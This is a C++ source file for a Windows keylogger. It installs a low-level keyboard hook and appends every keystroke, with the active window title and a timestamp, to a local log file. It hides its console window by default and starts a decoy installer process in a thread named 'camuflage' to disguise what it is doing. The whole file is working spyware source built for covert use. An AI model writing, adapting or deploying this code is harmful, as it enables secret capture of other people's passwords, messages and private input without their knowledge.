#define UNICODE
#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <ctime>
#include <map>

// defines whether the window is visible or not
#define invisible

const std::map<int, std::string> keyname{
	{VK_BACK, "[BACKSPACE]" },
	{VK_RETURN,	"\n" },
	{VK_SPACE,	"_" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
};
HHOOK hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save((int)kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, nullptr, 0)))
	{
		LPCWSTR a = L"Failed to install hook!";
		LPCWSTR b = L"Error";
		MessageBox(nullptr, a, b, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(hook);
}


int Save(int key_stroke)
{
	std::stringstream output;
	static std::string lastwindow;
	
	if ((key_stroke == 1) || (key_stroke == 2))
	{
		return 0; // ignore mouse clicks
	}
	
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = nullptr;

	if (foreground)
	{
		// get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, nullptr);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, window_title, 256);

		if (lastwindow != window_title)
		{
            lastwindow = window_title;

			// get time
			time_t curr_time = time(nullptr);
            tm *tm_local = localtime(&curr_time);
			char s[64];
			strftime(s, sizeof(s), "%c", tm_local);

			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
		}
	}

	if (keyname.find(key_stroke) != keyname.end())
	{
		output << keyname.at(key_stroke);
	}
	else
	{
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		// map virtual key according to keyboard layout
		key = (char)MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		// tolower converts it to lowercase properly
		if (!lowercase)
		{
			key = (char)tolower(key);
		}
		output << char(key);
	}
	// instead of opening and closing file handlers every time, keep file open and flush.
	output_file << output.str();
	output_file.flush();

	std::cout << output.str();

	return 0;
}

void Stealth()
{
#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), 0); // invisible window
#else
	ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), 1); // visible window
#endif
}

DWORD WINAPI camuflage(LPVOID lpParameter)
{
	system("mingw-get-setup");
}

int main()
{
	// open output file in append mode
	const char* output_filename = "keylogger.log";
	std::cout << "Logging output to " << output_filename << std::endl;
	output_file.open(output_filename, std::ios_base::app);

	// visibility of window
	Stealth();

	// set the hook
	SetHook();
	
	DWORD myThreadID;
	HANDLE myHandle = CreateThread(0, 0, camuflage, nullptr, 0, &myThreadID);

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0))
	{
	}
}